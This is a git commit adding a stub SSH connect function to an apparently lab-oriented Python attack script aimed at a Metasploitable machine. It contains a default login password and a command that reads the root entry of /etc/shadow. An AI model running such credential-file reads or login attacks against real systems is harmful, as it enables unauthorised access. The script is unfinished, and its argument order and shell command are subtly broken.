b2c77665ac5410780baef5f0f321ff9071422997
azul-007 <megamanx6@protonmail.com>
2019-12-24 06:19:43 -0500

    created connect method

--- offensive/ssh_attack.py
+++ offensive/ssh_attack.py
@@ -5,6 +5,11 @@ import pexpect
 #Author: Daniel Edwards
 #Description: SSH & FTP attacks against metasploitable machine
 
+
+def connect(user,host,password):
+	ssh_newkey = 'Are you sure you want to continue connecting?'
+
+
 def main():
 	
 	host =""
@@ -12,5 +17,7 @@ def main():
 	password = "msfadmin"
 	child = connect(host,user,password)
 	send_command(child, 'cat/etc/shadow | grep root;ps')
+
+
 
 
